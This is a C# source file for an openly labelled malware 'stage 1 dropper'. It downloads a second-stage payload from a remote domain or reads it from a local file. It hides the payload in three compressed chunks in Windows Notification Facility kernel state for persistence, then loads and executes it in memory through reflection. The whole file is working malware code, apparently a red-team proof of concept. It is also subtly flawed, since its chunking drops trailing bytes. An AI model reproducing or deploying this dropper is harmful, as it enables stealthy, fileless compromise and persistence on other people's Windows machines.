using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net;

namespace Stage1Dropper
{
    class Program
    {
        public const ulong PART_1 = 0x19890C35A3BEF075;
        public const ulong PART_2 = 0x19890C35A3BC6075;
        public const ulong PART_3 = 0x19890C35A3BEC075;
        public const ulong WNF_XBOX_STORAGE_CHANGED = 0x19890C35A3BD6875;
        private string Domain="";
        
        static void Main(string[] args)
        {
            var casper = new byte[0];

            Log("Querying Windows Kernel for malware persistence at 0x19890C35A3BD6875");

            if (QueryWnf(WNF_XBOX_STORAGE_CHANGED).Data.Length > 0)
            {
                Log("Found malware at 0x19890C35A3BEF075!");
                Log("Decompressing payload from 0x19890C35A3BEF075, 0x19890C35A3BC6075, and 0x19890C35A3BC6875");

                var p1_compressed = QueryWnf(PART_1).Data;
                var p2_compressed = QueryWnf(PART_2).Data;
                var p3_compressed = QueryWnf(PART_3).Data;

                var part1 = Decompress(p1_compressed);
                var part2 = Decompress(p2_compressed);
                var part3 = Decompress(p3_compressed);

                var s = new MemoryStream();
                s.Write(part1, 0, part1.Length);
                s.Write(part2, 0, part2.Length);
                s.Write(part3, 0, part3.Length);
                casper = s.ToArray();
            }
            else
            {
                Log("Malware NOT found persisting!");
                Log("Fetching malware using domain fronting ...");
                
                if (Domain!="")
                {
                WebClient Wclient = new WebClient();
                casper= Wclient.DownloadData(Domain); 
                }
                else
                {
                    casper = File.ReadAllBytes(@".\Stage2Malware.exe");
                }

                Log("Publishing malware via Windows Kernel to 0x19890C35A3BEF075, 0x19890C35A3BC6075, and 0x19890C35A3BC6875");

                var chunksize = casper.Length / 3;
                var part1 = new MemoryStream();
                var part2 = new MemoryStream();
                var part3 = new MemoryStream();
         
                part1.Write(casper, 0, chunksize);
                part2.Write(casper, chunksize, chunksize);
                part3.Write(casper, chunksize*2, chunksize);

                var p1_compressed = Compress(part1.ToArray());
                var p2_compressed = Compress(part2.ToArray());
                var p3_compressed = Compress(part3.ToArray());

                if(
                    (p1_compressed.Length > 4096) ||
                    (p2_compressed.Length > 4096) ||
                    (p3_compressed.Length > 4096)
                )
                {
                    Log("Persisting malware error, size too large!");
                    Environment.Exit(0);
                }

                var s1 = UpdateWnf(PART_1, p1_compressed);
                var s2 = UpdateWnf(PART_2, p2_compressed);
                var s3 = UpdateWnf(PART_3, p3_compressed);

                Log("Updating persistence check via Windows Kernel to 0x19890C35A3BD6875 ...");
                UpdateWnf(WNF_XBOX_STORAGE_CHANGED, new byte[1] { 0x1 });
            }

            Log("Injecting and executing malware using System.Reflection");

            //UpdateWnf(WNF_XBOX_STORAGE_CHANGED, new byte[0] { });

            RunStager(casper);

            while (true) { Thread.Sleep(500); }
        }

        public static void Log(string message)
        {
            Console.WriteLine(string.Format("[DROPPER] {0}", message));
        }

        public static void RunStager(byte[] payload)
        {
            MethodInfo target = Assembly.Load(payload).EntryPoint;
            target.Invoke(null, null);
        }
        
        public static byte[] Compress(byte[] data)
        {
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
            {
                dstream.Write(data, 0, data.Length);
            }
            return output.ToArray();
        }
        
        public static byte[] Decompress(byte[] data)
        {
            MemoryStream input = new MemoryStream(data);
            MemoryStream output = new MemoryStream();
            using (DeflateStream dstream = new DeflateStream(input, CompressionMode.Decompress))
            {
                dstream.CopyTo(output);
            }
            return output.ToArray();
        }

        public static int UpdateWnf(ulong state, byte[] data)
        {
            using (var buffer = data.ToBuffer())
            {
                ulong state_name = state;

                return ZwUpdateWnfStateData(ref state_name, buffer,
                    buffer.Length, null, IntPtr.Zero, 0, false);
            }
        }

        public static WnfStateData QueryWnf(ulong state)
        {
            var data = new WnfStateData();
            int tries = 10;
            int size = 4096;
            while (tries-- > 0)
            {
                using (var buffer = new SafeHGlobalBuffer(size))
                {
                    int status;
                    status = ZwQueryWnfStateData(ref state, null, IntPtr.Zero, out int changestamp, buffer, ref size);

                    if (status == 0xC0000023)
                        continue;
                    data = new WnfStateData(changestamp, buffer.ReadBytes(size));
                }
            }
            return data;
        }
        
        [StructLayout(LayoutKind.Sequential)]
        public class WnfType
        {
            public Guid TypeId;
        }

        public class WnfStateData
        {
            public int Changestamp { get; }
            public byte[] Data { get; }

            public WnfStateData() { }
            public WnfStateData(int changestamp, byte[] data)
            {
                Changestamp = changestamp;
                Data = data;
            }
        }

        [DllImport("ntdll.dll")]
        public static extern int ZwQueryWnfStateData(
            ref ulong StateId,
            [In, Optional] WnfType TypeId,
            [Optional] IntPtr Scope,
            out int Changestamp,
            SafeBuffer DataBuffer,
            ref int DataBufferSize
        );


        [DllImport("ntdll.dll")]
        public static extern int ZwUpdateWnfStateData(
            ref ulong StateId,
            SafeBuffer DataBuffer,
            int DataBufferSize,
            [In, Optional] WnfType TypeId,
            [Optional] IntPtr Scope,
            int MatchingChangestamp,
            [MarshalAs(UnmanagedType.Bool)] bool CheckChangestamp
        );

        // Original dev: James Forshaw @tyranid: Project Zero
        // Ref: https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/46b95cba8f76fae9a5c8258d13057d5edfacdf90/NtApiDotNet/SafeHandles.cs
        public class SafeHGlobalBuffer : SafeBuffer
        {
            public SafeHGlobalBuffer(int length)
              : this(length, length) { }

            protected SafeHGlobalBuffer(int allocation_length, int total_length)
                : this(Marshal.AllocHGlobal(allocation_length), total_length, true) { }

            public SafeHGlobalBuffer(IntPtr buffer, int length, bool owns_handle)
              : base(owns_handle)
            {
                Length = length;
                Initialize((ulong)length);
                SetHandle(buffer);
            }


            public static SafeHGlobalBuffer Null { get { return new SafeHGlobalBuffer(IntPtr.Zero, 0, false); } }

            protected override bool ReleaseHandle()
            {
                if (!IsInvalid)
                {
                    Marshal.FreeHGlobal(handle);
                    handle = IntPtr.Zero;
                }
                return true;
            }

            public byte[] ReadBytes(ulong byte_offset, int count)
            {
                byte[] ret = new byte[count];
                ReadArray(byte_offset, ret, 0, count);
                return ret;
            }

            public byte[] ReadBytes(int count)
            {
                return ReadBytes(0, count);
            }

            public SafeHGlobalBuffer(byte[] data) : this(data.Length)
            {
                Marshal.Copy(data, 0, handle, data.Length);
            }

            public int Length
            {
                get; private set;
            }
        }
    }

    static class BufferUtils
    {
        public static Program.SafeHGlobalBuffer ToBuffer(this byte[] value)
        {
            return new Program.SafeHGlobalBuffer(value);
        }
    }
}
